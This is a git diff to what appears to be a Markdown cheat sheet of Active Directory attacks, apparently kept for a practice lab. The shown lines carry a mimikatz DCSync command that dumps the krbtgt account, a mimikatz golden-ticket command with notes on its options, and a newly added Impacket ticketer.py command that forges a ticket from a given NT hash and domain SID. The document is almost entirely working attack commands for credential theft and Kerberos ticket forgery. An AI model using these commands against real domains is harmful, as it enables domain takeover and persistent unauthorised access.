@@ -31,7 +31,7 @@ lsadump::dcsync /domain:lol.local /user:krbtgt
 
 ---
 ### golden ticket
-
+mimkatz:
 ```powershell
 kerberos::golden /user:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
 
@@ -44,4 +44,14 @@ kerberos::golden /user:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:
 /ptt to immediately inject the golden ticket into memory for use.
 - /aes128 – the AES128 key
 - /aes256 – the AES256 key
+```
+
+tickter.py
+```
+ticketer.py -nthash 60d3803405f9c6f1c4f2ab08a0c18da0 \
+  -domain-sid S-1-5-21-3276181164-781382281-1178861266 \
+  -domain north.sevenkingdoms.local \
+  -user eddard.stark \
+  eddard.stark
+
 ```
